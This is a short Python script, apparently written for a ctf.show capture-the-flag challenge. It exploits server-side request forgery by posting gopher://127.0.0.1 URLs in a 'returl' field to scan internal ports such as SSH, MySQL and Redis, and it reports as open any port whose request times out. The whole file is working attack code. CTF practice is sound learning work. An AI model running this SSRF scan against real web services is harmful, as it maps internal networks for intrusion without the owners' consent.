import requests

url = "http://7106fb88-37d0-48fb-8612-d416432a0cf5.challenge.ctf.show/"

ports = [21, 22, 80, 443, 3389, 1433, 3306, 6379]

# 21 ftp
# 22 ssh
# 80 http
# 443 https
# 3389 rdp windows远程桌面
# 1433 ms-sqlserver 默认端口
# 3306 mysql 默认端口
# 6379 redis 默认端口
# 9000 php-fpm 默认端口

for p in ports:
    try:
        # data={"url":f"gopher://127.0.0.1:{p}/"}
        data = {"u": "admin",
                "returl": f"gopher://127.0.0.1:{p}/"}
        response = requests.post(url=url, data=data, timeout=2)
        print(response.text)
    except:
        print(f"端口{p}开放")
